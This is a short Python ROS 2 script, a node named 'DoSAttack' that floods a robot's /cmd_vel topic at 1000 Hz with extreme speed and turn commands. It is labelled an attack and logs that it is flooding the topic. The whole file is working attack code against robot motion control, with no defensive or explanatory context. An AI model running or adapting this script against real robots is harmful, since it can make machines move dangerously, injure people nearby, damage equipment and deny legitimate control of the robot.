import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist

class DoSAttack(Node):
    def __init__(self):
        super().__init__('dos_attack')
        self.publisher = self.create_publisher(Twist, '/cmd_vel', 10)
        self.timer = self.create_timer(0.001, self.publish_message)  # 1000Hz spam

    def publish_message(self):
        msg = Twist()
        msg.linear.x = 100.0  # Extreme speed
        msg.angular.z = 100.0 # Extreme turn
        self.publisher.publish(msg)
        self.get_logger().info("Flooding /cmd_vel with extreme commands!")

def main():
    rclpy.init()
    attack_node = DoSAttack()
    rclpy.spin(attack_node)
    attack_node.destroy_node()
    rclpy.shutdown()

if __name__ == '__main__':
    main()
